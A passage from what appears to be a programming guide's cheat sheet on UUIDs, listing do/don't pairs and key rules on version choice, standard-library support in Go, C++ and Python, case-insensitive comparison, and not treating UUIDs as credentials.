✅ [All] Use time-ordered v7 (or ULID) for keys so inserts are roughly sequential and range-scannable.
❌ [All] Treating a UUID as a secret or auth token — it identifies, it doesn't authenticate, and it may appear in logs/URLs.
✅ [All] Pair the ID with a real, unguessable credential (signed token / session) for authorization.
❌ [Go/C++] Assuming the standard library provides UUIDs — it doesn't; or [Python] using v1, which leaks the MAC address and timestamp.
✅ [Go/C++] Add a maintained UUID library; [Python] prefer v4/v7 over v1 to avoid leaking host info.
❌ [All] Comparing UUID strings with case/format sensitivity ("A1B2..." vs "a1b2...").
✅ [All] Parse to the canonical UUID type and compare those (or normalize case) rather than raw strings.
Key Rules:
  • Choose v7 (time-ordered) for database keys and v4 (random) for opaque, order-independent IDs.
  • A UUID is an identifier, never a credential — don't rely on unguessability for security.
  • Only Python (and browser/Node for v4) ship UUIDs in the standard library; Go and C++ need an external crate/library.
